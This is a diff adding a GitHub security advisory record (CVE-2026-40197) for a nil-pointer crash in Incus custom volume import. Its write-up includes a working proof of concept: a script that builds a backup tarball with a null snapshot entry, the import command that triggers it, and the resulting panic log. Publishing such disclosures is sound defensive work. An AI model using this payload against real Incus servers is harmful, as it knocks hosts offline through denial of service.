@@ -1,0 +1,45 @@
+{
+  "id": "GHSA-r7w7-mmxr-47r9",
+  "modified": "2026-05-05T16:13:32.484320Z",
+  "published": "2026-05-04T17:45:21Z",
+  "aliases": [
+    "CVE-2026-40197"
+  ],
+  "summary": "Incus has a Nil-Pointer Dereference via Custom Volume Import",
+  "details": "### Summary\nMissing validation logic in the storage volume import logic allows an authenticated user with access to Incus' storage volume feature to cause the Incus daemon to crash. Repeated use of this issue can be used to keep Incus offline causing a denial of service.\n\n### Details\nThe custom volume backup import subsystem contains a nil-pointer dereference vulnerability that allows an authenticated attacker to crash the daemon during import operations.\n\nIn the snapshot import loop, the daemon iterates over entries from srcBackup.Config.VolumeSnapshots, which is a slice of pointers. The implementation assumes that each slice element is non-nil and immediately dereferences it through expressions such as snapshot.Name, snapshot.Config, snapshot.Description, snapshot.CreatedAt, and *snapshot.ExpiresAt without first validating that the element itself is initialized.\n\nBecause the YAML unmarshaler accepts explicit null array elements from an attacker-controlled index.yaml and converts them into nil pointers inside the slice, an authenticated attacker can supply a backup archive containing a null entry in the volume_snapshots array. This causes the daemon to dereference a nil pointer during custom volume import and terminate, resulting in immediate denial of service on the node.\n\nAffected File:\nhttps://github.com/lxc/incus/blob/v6.22.0/internal/server/storage/backend.go \n\nAffected Code:\n```\nfunc (b *backend) CreateCustomVolumeFromBackup(srcBackup backup.Info, srcData io.ReadSeeker, op *operations.Operation) error {\n    [...]\n    // Create database entries for new storage volume snapshots.\n    for _, s := range srcBackup.Config.VolumeSnapshots {\n        snapshot := s // Local var for revert.\n        snapName := snapshot.Name\n\n        // Due to a historical bug, the volume snapshot names were sometimes written in their full form\n        // (\u003cparent\u003e/\u003csnap\u003e) rather than the expected snapshot name only form, so we need to handle both.\n        if internalInstance.IsSnapshot(snapshot.Name) {\n            _, snapName, _ = api.GetParentAndSnapshotName(snapshot.Name)\n        }\n\n        fullSnapName := drivers.GetSnapshotVolumeName(srcBackup.Name, snapName)\n        snapVolStorageName := project.StorageVolume(srcBackup.Project, fullSnapName)\n        snapVol := b.GetVolume(drivers.VolumeTypeCustom, drivers.ContentType(srcBackup.Config.Volume.ContentType), snapVolStorageName, snapshot.Config)\n\n        // Validate config and create database entry for new storage volume.\n        // Strip unsupported config keys (in case the export was made from a different type of storage pool).\n        err = VolumeDBCreate(b, srcBackup.Project, fullSnapName, snapshot.Description, snapVol.Type(), true, snapVol.Config(), snapshot.CreatedAt, *snapshot.ExpiresAt, snapVol.ContentType(), true, true)\n        if err != nil {\n            return err\n        }\n\n        reverter.Add(func() { _ = VolumeDBDelete(b, srcBackup.Project, fullSnapName, snapVol.Type()) })\n    }\n    [...]\n}\n```\n\n### PoC\nThe following PoC demonstrates that a crafted custom volume backup archive containing a null entry in volume_snapshots can trigger a nil-pointer dereference during import.\n\nStep 1: Generate the malformed archive\n\nFrom a client or workstation with shell access, create a custom volume backup archive whose index.yaml contains one physical snapshot directory and a matching volume_snapshots array containing a literal null entry.\n\nCommands:\n```\ncat \u003c\u003cEOF \u003e poc_nil_snapshot.sh\n#!/bin/bash\nset -e\n\necho \"[*] Building null snapshot dereference payload...\"\n\nmkdir -p backup/volume\nmkdir -p backup/snapshots/snap0\n\ncat \u003c\u003cEOT \u003e backup/index.yaml\nname: panic-nil-snap\nbackend: dir\npool: default\ntype: custom\nsnapshots:\n  - snap0\nconfig:\n  volume:\n    name: panic-nil-snap\n    type: custom\n    content_type: filesystem\n    config: {}\n  volume_snapshots:\n    - null\nEOT\n\ntar -czf exploit_null_snapshot.tar.gz backup/\nrm -rf backup/\n\necho \"[+] PoC Tarball Created: exploit_null_snapshot.tar.gz\"\nEOF\n\nbash poc_nil_snapshot.sh\n```\n\nResult:\n```\n[+] PoC Tarball Created: exploit_null_snapshot.tar.gz\n```\n\nStep 2: Trigger the vulnerable custom volume import path\n\nFrom an Incus client with permission to import custom volumes, import the crafted archive into a valid storage pool.\n\nCommand:\n```\nincus storage volume import default exploit_null_snapshot.tar.gz\n```\n\nResult:\n```\nError: Operation not found\n```\n\nStep 3: Verify the daemon panic\n\nOn the Incus host, inspect the service logs and confirm that the daemon terminated with a nil-pointer dereference in CreateCustomVolumeFromBackup.\n\n\nCommand:\n```\njournalctl -u incus --since \"3 minutes ago\" | grep -A 15 \"panic:\"\n```\n\nResult:\n```\npanic: runtime error: invalid memory address or nil pointer dereference\ngithub.com/lxc/incus/v6/internal/server/storage.(*backend).CreateCustomVolumeFromBackup(...)\n\nMar 23 17:27:55 incus-7a incusd[238672]: panic: runtime error: invalid memory address or nil pointer dereference\nMar 23 17:27:55 incus-7a incusd[238672]: [signal SIGSEGV: segmentation violation code=0x1 addr=0x18 pc=0x16881c3]\nMar 23 17:27:55 incus-7a incusd[238672]: goroutine 5802 [running]:\nMar 23 17:27:55 incus-7a incusd[238672]: github.com/lxc/incus/v6/internal/server/storage.(*backend).CreateCustomVolumeFromBackup(0x31c86ff85800, {{0x31c870a13203, 0x9}, {0x31c870a13300, 0xe}, {0x31c870a13318, 0x3}, {0x31c86f6d6298, 0x7}, {0x31c86fd13280, ...}, ...}, ...)\nMar 23 17:27:55 incus-7a incusd[238672]:         /home/stgraber/Code/lxc/incus/internal/server/storage/backend.go:7627 +0xe03\nMar 23 17:27:55 incus-7a incusd[238672]: main.createStoragePoolVolumeFromBackup.func6(0x31c86fa5e000?)\nMar 23 17:27:55 incus-7a incusd[238672]:         /home/stgraber/Code/lxc/incus/cmd/incusd/storage_volumes.go:2715 +0x3f4\nMar 23 17:27:55 incus-7a incusd[238672]: github.com/lxc/incus/v6/internal/server/operations.(*Operation).Start.func1(0x31c86f758140)\nMar 23 17:27:55 incus-7a incusd[238672]:         /home/stgraber/Code/lxc/incus/internal/server/operations/operations.go:307 +0x26\nMar 23 17:27:55 incus-7a incusd[238672]: created by github.com/lxc/incus/v6/internal/server/operations.(*Operation).Start in goroutine 5783\nMar 23 17:27:55 incus-7a incusd[238672]:         /home/stgraber/Code/lxc/incus/internal/server/operations/operations.go:306 +0x105\nMar 23 17:27:55 incus-7a systemd[1]: incus.service: Main process exited, code=exited, status=2/INVALIDARGUMENT\nMar 23 17:27:55 incus-7a systemd[1]: incus.service: Failed with result 'exit-code'.\nMar 23 17:27:55 incus-7a systemd[1]: incus.service: Unit process 159855 (qemu-system-x86) remains running after unit stopped.\nMar 23 17:27:55 incus-7a systemd[1]: incus.service: Unit process 238744 (dnsmasq) remains running after unit stopped.\nMar 23 17:27:55 incus-7a systemd[1]: incus.service: Unit process 238760 (dnsmasq) remains running after unit stopped.\n```\n\nIt is recommended to validate that each element of srcBackup.Config.VolumeSnapshots is non-nil before dereferencing it. If the archive contains a null snapshot entry, the function should return a structured validation error and abort the import gracefully rather than allowing a runtime panic to crash the service.\n\n### Credit\nThis issue was discovered and reported by the team at 7asecurity (https://7asecurity.com/)",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/lxc/incus/v6/cmd/incusd",
+        "purl": "pkg:golang/github.com/lxc/incus/v6/cmd/incusd"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "7.0.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-r7w7-mmxr-47r9/GHSA-r7w7-mmxr-47r9.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/lxc/incus/security/advisories/GHSA-r7w7-mmxr-47r9"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/lxc/incus"
+    }
+  ]
+}
